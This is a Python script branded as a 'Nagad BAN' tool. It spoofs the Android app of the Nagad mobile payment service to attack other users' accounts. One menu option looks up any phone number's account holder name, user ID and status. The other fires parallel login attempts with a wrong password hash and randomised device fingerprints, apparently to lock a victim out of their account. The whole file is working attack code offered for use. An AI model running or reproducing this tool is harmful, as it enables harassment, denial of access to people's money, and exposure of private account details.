import os
import sys
import requests
import random
import string
import threading
import json
import time
from colorama import Fore, Style, init

# 🔹 Color Setup
init(autoreset=True)
CYAN = Fore.CYAN
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
WHITE = Fore.WHITE

# 🎨 ইউনিক ব্যাকগ্রাউন্ড (Matrix Effect)
def matrix_effect():
    chars = "💥💥💥💥💥🎉🎉💥💥🎉🎉💥💥🎉🎉💥💥🎉🎉💥💥"
    width = os.get_terminal_size().columns
    print("\n" * 5)
    for _ in range(10):
        print("".join(random.choice(chars) for _ in range(width)))
        time.sleep(0.1)

# 🔥 ইউনিক 3D ব্যানার ডিজাইন
def banner():
    matrix_effect()
    print(f"""{CYAN}
███████╗███████╗     ██████╗██╗   ██╗███████╗██████╗ 
██╔════╝██╔════╝     ██╔══██╗██║   ██║██╔════╝██╔══██╗
█████╗  █████╗       ██████╔╝██║   ██║█████╗  ██████╔╝
██╔══╝  ██╔══╝       ██╔═══╝ ██║   ██║██╔══╝  ██╔═══╝ 
███████╗██║          ██║     ╚██████╔╝███████╗██║     
╚══════╝╚═╝          ╚═╝      ╚═════╝ ╚══════╝╚═╝     
{RED}================================================
{MAGENTA}🔥 TEAM-ACS - ULTIMATE NAGAD TOOL 🔥
{MAGENTA}💀 DEVELOPER: MR SHIMUL 💀
{RED}================================================
""")

# ✅ র‍্যান্ডম DEVICE-FGP জেনারেটর
def generate_random_fgp():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=64))

# 🔹 নগদ Login System (🔥 Realtime Progress Bar সহ)
def nagad_login():
    banner()
    print(f"{BLUE}📌 Nagad Login System (Secure Mode)")
    url = 'https://app2.mynagad.com:20002/api/login'
    headers = {
        'Host': 'app2.mynagad.com:20002',
        'User-Agent': 'okhttp/3.14.9',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json; charset=UTF-8',
        'X-KM-UserId': '1894306',
        'X-KM-User-AspId': '100012345612345',
        'X-KM-User-Agent': 'ANDROID/1164',
        'X-KM-Accept-language': 'bn',
        'X-KM-AppCode': '01'
    }

    username = input(f"{YELLOW}📌 Enter Nagad Number: ")
    payload = {
        "aspId": "100012345612345",
        "mpaId": None,
        "password": "2EE1A4C2B1F11F0CA375D1429E7902A1D84B900348AE65E624C83B1589FF2E27",
        "username": username
    }

    def send_request(request_number):
        local_headers = headers.copy()
        local_headers['X-KM-DEVICE-FGP'] = generate_random_fgp()
        print(f"{GREEN}🚀 Sending Request {request_number}...", end="")
        sys.stdout.flush()
        time.sleep(0.3)
        response = requests.post(url, headers=local_headers, json=payload)
        print(f" ✅ {MAGENTA}Response: {response.status_code}")

    threads = []
    for i in range(5):  # 🔥 Multiple Parallel Requests
        thread = threading.Thread(target=send_request, args=(i + 1,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# 🔹 নগদ User Status Checker (🔥 JSON ডিকোড সাপোর্ট সহ)
def nagad_check_user():
    banner()
    print(f"{GREEN}📌 Nagad User Status Checker")
    url = "https://app2.mynagad.com:20002/api/user/check-user-status-for-log-in"
    msisdn = input(f"{YELLOW}📌 Enter Number: ")

    params = {"msisdn": msisdn}
    headers = {
        "Host": "app2.mynagad.com:20002",
        "User-Agent": "okhttp/3.14.9",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "X-KM-User-AspId": "100012345612345",
        "X-KM-User-Agent": "ANDROID/1164",
        "X-KM-DEVICE-FGP": generate_random_fgp(),
        "X-KM-Accept-language": "bn",
        "X-KM-AppCode": "01"
    }

    response = requests.get(url, headers=headers, params=params)

    if response.status_code == 200:
        try:
            data = response.json()
            print(f"{GREEN}✅ Name: {data.get('name', 'N/A')}")
            print(f"{BLUE}✅ UserId: {data.get('userId', 'N/A')}")
            print(f"{MAGENTA}✅ Status: {data.get('status', 'N/A')}")
        except json.JSONDecodeError:
            print(f"{RED}⚠️ Failed to parse response!")
    else:
        print(f"{RED}❌ Request failed! Status Code: {response.status_code}")

# 🔹 মেনু সিস্টেম (🔥 অটো স্ক্রলিং ইফেক্ট)
def show_menu():
    while True:
        banner()
        print(f"{CYAN}📌 Select an option:")
        print(f"{GREEN}1️⃣ Nagad INFO")
        print(f"{RED}2️⃣ Nagad BAN")
        print(f"{YELLOW}3️⃣ Exit")
        
        choice = input(f"{BLUE}👉 Enter your choice: ")

        if choice == "1":
            nagad_check_user()
        elif choice == "2":
            nagad_login()
        elif choice == "3":
            print(f"{YELLOW}🚀 Exiting...")
            sys.exit()
        else:
            print(f"{RED}❌ Invalid choice! Try again.")

# 🚀 Start Program
show_menu()